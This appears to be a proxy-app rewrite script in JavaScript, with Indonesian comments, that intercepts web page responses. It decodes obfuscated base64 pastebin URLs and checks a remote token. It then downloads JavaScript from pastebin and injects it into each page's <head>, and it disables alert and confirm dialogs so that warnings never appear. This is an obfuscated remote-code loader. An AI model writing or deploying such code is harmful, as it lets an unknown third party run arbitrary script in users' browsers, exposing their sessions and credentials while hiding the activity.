const MY_TOKEN = "ojeng_gacor"; 

const _0xU1 = "aHR0cHM6"+"Ly9wYXN0ZWJpbi"+"5jb20vcmF3L0d"+"NMVIyZjh1";
const _0xU2 = "aHR0cHM6"+"Ly9wYXN0ZWJp"+"bi5jb20vcmF3L"+"2tSWFY3ZnNU";

const _0xR1 = { url: atob(_0xU1) + "?t=" + Math.random() };

$task.fetch(_0xR1).then(response => {
    let b = $response.body;
    if (response.body && response.body.includes(MY_TOKEN)) {
        const _0xR2 = { url: atob(_0xU2) + "?t=" + Math.random() };
        $task.fetch(_0xR2).then(resp2 => {
            if (resp2.body && b) {
                // MODIFIKASI KERAS: Menghapus perintah alert/popup dari script Kaurev sebelum masuk ke browser
                let p = resp2.body
                    .replace(/alert\(/g, "console.log(") // Ubah alert jadi log biasa
                    .replace(/confirm\(/g, "console.log(")
                    .replace(/prompt\(/g, "console.log(");
                
                // Matikan fungsi notifikasi di level window
                const killPopup = "<script>window.alert=function(){};window.confirm=function(){};</script>";
                
                $done({ body: b.replace("<head>", "<head>" + killPopup + p) });
            } else { $done({}); }
        });
    } else { $done({}); }
}, () => { $done({}); });
